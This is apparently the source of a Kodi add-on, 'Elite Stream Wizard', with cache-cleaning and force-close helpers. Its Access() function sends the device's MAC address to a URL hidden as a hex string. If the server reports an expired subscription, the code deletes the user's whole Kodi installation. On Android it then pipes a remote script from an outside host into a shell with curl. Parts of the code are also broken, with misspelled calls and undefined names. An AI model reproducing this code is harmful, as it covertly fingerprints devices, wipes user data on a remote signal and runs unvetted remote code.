import xbmc, xbmcaddon,binascii, xbmcgui, xbmcplugin, os, sys, xbmcvfs, glob
import shutil
import urllib2,urllib
import time
import re
import uservar
import plugintools


AddonTitle="[COLOR=red]Elite Stream Wizard[/COLOR]"


def FRESHSTARTBUILD():
    addonPath=xbmcaddon.Addon(id=uservar.ADDON_ID).getAddonInfo('path'); addonPath=xbmc.translatePath(addonPath); EXCLUDES = ['repository.EliteStream']
    xbmcPath=os.path.join(addonPath,"..",".."); xbmcPath=os.path.abspath(xbmcPath); plugintools.log("freshstart.main_list xbmcPath="+xbmcPath); failed=False
    for root, dirs, files in os.walk(xbmcPath,topdown=True):
        dirs[:] = [d for d in dirs if d not in EXCLUDES]
        for name in files:
            try: os.remove(os.path.join(root,name))
            except:
                if name not in ["Addons15.db","MyVideos75.db","Textures13.db","xbmc.log"]: failed=True
                plugintools.log("Error removing "+root+" "+name)
        for name in dirs:
            try: os.rmdir(os.path.join(root,name))
            except:
                if name not in ["Database","userdata"]: failed=True
                plugintools.log("Error removing "+root+" "+name)
	else:
	    pass
		
def platform():
    if xbmc.getCondVisibility('system.platform.android'):
        return 'android'
    elif xbmc.getCondVisibility('system.platform.linux'):
        return 'linux'
    elif xbmc.getCondVisibility('system.platform.windows'):
        return 'windows'
    elif xbmc.getCondVisibility('system.platform.osx'):
        return 'osx'
    elif xbmc.getCondVisibility('system.platform.atv2'):
        return 'atv2'
    elif xbmc.getCondVisibility('system.platform.ios'):
        return 'ios'

def plat(): 
    myplatform = platform()
    if myplatform == 'android': 
        for line in open("/sys/class/net/eth0/address"):
            return line.strip()
    elif myplatform == 'windows':
        for line in os.popen("ipconfig /all"): 
            if line.lstrip().startswith('Physical Address'): 
                mac = line.split(':')[1].strip().replace('-',':') 
                break; 
        return mac				
    else:
        if xbmc.getInfoLabel('Network.MacAddress') != None:
            mac_address = xbmc.getInfoLabel('Network.MacAddress')
        else:
            mac_address = None
        return mac_address

def END():
    print '############################################################       DELETING PACKAGES             ###############################################################'
    packages_cache_path = xbmc.translatePath(os.path.join('special://home/addons/packages', ''))
    try:    
        for root, dirs, files in os.walk(packages_cache_path):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                for f in files:
                    os.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d))
    except: 
        dialog = xbmcgui.Dialog()
        dialog.ok(AddonTitle, "Sorry we were not able to remove Package Files", "[COLOR red]Contact us for support[/COLOR]")
	print '############################################################       DELETING STANDARD CACHE             ###############################################################'
    xbmc_cache_path = os.path.join(xbmc.translatePath('special://home'), 'cache')
    if os.path.exists(xbmc_cache_path)==True:    
        for root, dirs, files in os.walk(xbmc_cache_path):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                for f in files:
                    try:
                        os.unlink(os.path.join(root, f))
                    except:
                        pass
                for d in dirs:
                    try:
                        hutil.rmtree(os.path.join(root, d))
                    except:
                        pass        
            else:
                pass

    if xbmc.getCondVisibility('system.platform.ATV2'):
        atv2_cache_a = os.path.join('/private/var/mobile/Library/Caches/AppleTV/Video/', 'Other')
        for root, dirs, files in os.walk(atv2_cache_a):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                for f in files:
                    os.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d))            
            else:
                pass
        atv2_cache_b = os.path.join('/private/var/mobile/Library/Caches/AppleTV/Video/', 'LocalAndRental')
        for root, dirs, files in os.walk(atv2_cache_b):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                for f in files:
                    os.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d))
            else:
                pass
    wtf_cache_path = os.path.join(xbmc.translatePath('special://profile/addon_data/plugin.video.whatthefurk/cache'), '')
    if os.path.exists(wtf_cache_path)==True:    
        for root, dirs, files in os.walk(wtf_cache_path):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                for f in files:
                    os.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d))
            else:
                pass
    channel4_cache_path= os.path.join(xbmc.translatePath('special://profile/addon_data/plugin.video.4od/cache'), '')
    if os.path.exists(channel4_cache_path)==True:    
        for root, dirs, files in os.walk(channel4_cache_path):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                for f in files:
                    os.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d))     
            else:
                pass
    iplayer_cache_path= os.path.join(xbmc.translatePath('special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache'), '')
    if os.path.exists(iplayer_cache_path)==True:    
        for root, dirs, files in os.walk(iplayer_cache_path):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                for f in files:
                    s.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d))  
            else:
                pass
    downloader_cache_path = os.path.join(xbmc.translatePath('special://profile/addon_data/script.module.simple.downloader'), '')
    if os.path.exists(downloader_cache_path)==True:    
        for root, dirs, files in os.walk(downloader_cache_path):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                for f in files:
                    os.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d))   
            else:
                pass
    itv_cache_path = os.path.join(xbmc.translatePath('special://profile/addon_data/plugin.video.itv/Images'), '')
    if os.path.exists(itv_cache_path)==True:    
        for root, dirs, files in os.walk(itv_cache_path):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                for f in files:
                    os.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d)) 
            else:
                pass
    temp_cache_path = os.path.join(xbmc.translatePath('special://home/temp'), '')
    if os.path.exists(temp_cache_path)==True:    
        for root, dirs, files in os.walk(temp_cache_path):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                for f in files:
                    os.unlink(os.path.join(root, f))
                for d in dirs:
                    shutil.rmtree(os.path.join(root, d)) 
            else:
                pass

def Access():
    u='68747470733a2f2f53696d706c654b6f72652e636f6d2f7a796a7361782f46726573683244656174682f70617373776f726470726f7465637456332e7068703f6d61633d'
    i=binascii.unhexlify(u); checkurl = i + str(plat())
    request = urllib2.Request(checkurl)
    response = urllib2.urlopen(request)
    status = response.read()
    data = status.split()
    #data.strip() = data[0].strip()
    if len(data) == 2:
        if 'subscribed' in data[1].lower():
            if data[1].lower() == 'subscribed':
                pass
            else: # this means nonsubscribed
                dialog = xbmcgui.Dialog()
                dialog.ok(AddonTitle, "Your Subscription has [COLOR red][B]ENDED![/B][/COLOR]", 'Please contact us to renew your subscription. [COLOR red][B]www.EliteStream.us[/B][/COLOR]', "[COLOR=red]"+"Mac Address: " + str(plat()) + "[/COLOR]")
                FRESHSTARTBUILD()
                tes()
        else:
            # either some error encountered or the person is not authorise
            pass
    else:
        if (data[0].strip().lower() == 'does_not_exists'):
            pass
        elif (data[0].strip().lower() == 'login_limit_exceeded'):
            pass
        elif (data[0].strip().lower() == 'invalid_call'):
            pass
	else:
	    pass

def TIMER(timer,title,text,text2):
    box = xbmcgui.DialogProgress()
    ret = box.create(' '+title)
    secs=0
    percent=0
    increment = int(100 / timer)
    while secs < timer:
        secs += 1
        percent = increment*secs
        secs_left = str((timer - secs))
        remaining_display = '[COLOR red][B]' + str(secs_left) + " seconds" + '[/B][/COLOR]'
        box.update(percent,text + remaining_display,"[COLOR=red]Please Wait...[/COLOR]", text2)
        xbmc.sleep(1000)

def tes():
    myplatform = platform()
    TIMER(7,AddonTitle,"Kodi will restart automaticly in: ", "Please Wait...")
    if myplatform == 'android':
        try: os.system ("curl -s http://u.dxs-it.com/jupdate/a/restart.sh | /system/bin/sh")
        except: pass
        try: os.system('adb shell am force-stop org.xbmc.kodi')
        except: pass
        try: os.system('adb shell am force-stop org.kodi')
        except: pass
        try: os.system('adb shell am force-stop org.xbmc.xbmc')
        except: pass
        try: os.system('adb shell am force-stop org.xbmc')
        except: pass
        try: dialog.ok(AddonTitle, "UNPLUG YOUR DEVICE", 'TO COMPLETE THE INSTALLATION PROCESS', "")
        except: pass
    elif myplatform == 'windows':
        try: killxbmca()
        except: pass
    else:
        try: killxbmca()
        except: pass

def killxbmca():
    myplatform = platform()
    print "Platform: " + str(myplatform)
    if myplatform == 'osx': # OSX
        print "############   try osx force close  #################"
        try: os.system('killall -9 XBMC')
        except: pass
        try: os.system('killall -9 Kodi')
        except: pass
        dialog.ok("[COLOR=red][B]WARNING  !!![/COLOR][/B]", "If you\'re seeing this message it means the force close", "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu.",'')
    elif myplatform == 'linux': #Linux
        print "############   try linux force close  #################"
        try: os.system('killall XBMC')
        except: pass
        try: os.system('killall Kodi')
        except: pass
        try: os.system('killall -9 xbmc.bin')
        except: pass
        try: os.system('killall -9 kodi.bin')
        except: pass
        dialog.ok("[COLOR=red][B]WARNING  !!![/COLOR][/B]", "If you\'re seeing this message it means the force close", "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu.",'')
    elif myplatform == 'android': # Android  
        print "############   try android force close  #################"
        try: os.system('adb shell am force-stop org.xbmc.kodi')
        except: pass
        try: os.system('adb shell am force-stop org.kodi')
        except: pass
        try: os.system('adb shell am force-stop org.xbmc.xbmc')
        except: pass
        try: os.system('adb shell am force-stop org.xbmc')
        except: pass        
        dialog.ok("[COLOR=red][B]WARNING  !!![/COLOR][/B]", "Your system has been detected as Android, you ", "[COLOR=yellow][B]MUST[/COLOR][/B] force close XBMC/Kodi. [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu.","Either close using Task Manager (If unsure pull the plug).")
    elif myplatform == 'windows': # Windows
        print "############   try windows force close  #################"
        try:
            os.system('@ECHO off')
            os.system('tskill XBMC.exe')
        except: pass
        try:
            os.system('@ECHO off')
            os.system('tskill Kodi.exe')
        except: pass
        try:
            os.system('@ECHO off')
            os.system('TASKKILL /im Kodi.exe /f')
        except: pass
        try:
            os.system('@ECHO off')
            os.system('TASKKILL /im XBMC.exe /f')
        except: pass
        dialog.ok("[COLOR=red][B]WARNING  !!![/COLOR][/B]", "If you\'re seeing this message it means the force close", "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu.","Use task manager and NOT ALT F4")
    else: #ATV
        print "############   try atv force close  #################"
        try: os.system('killall AppleTV')
        except: pass
        print "############   try raspbmc force close  #################" #OSMC / Raspbmc
        try: os.system('sudo initctl stop kodi')
        except: pass
        try: os.system('sudo initctl stop xbmc')
        except: pass
        dialog.ok("[COLOR=red][B]WARNING  !!![/COLOR][/B]", "If you\'re seeing this message it means the force close", "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit via the menu.","Your platform could not be detected so just pull the power cable.")    
	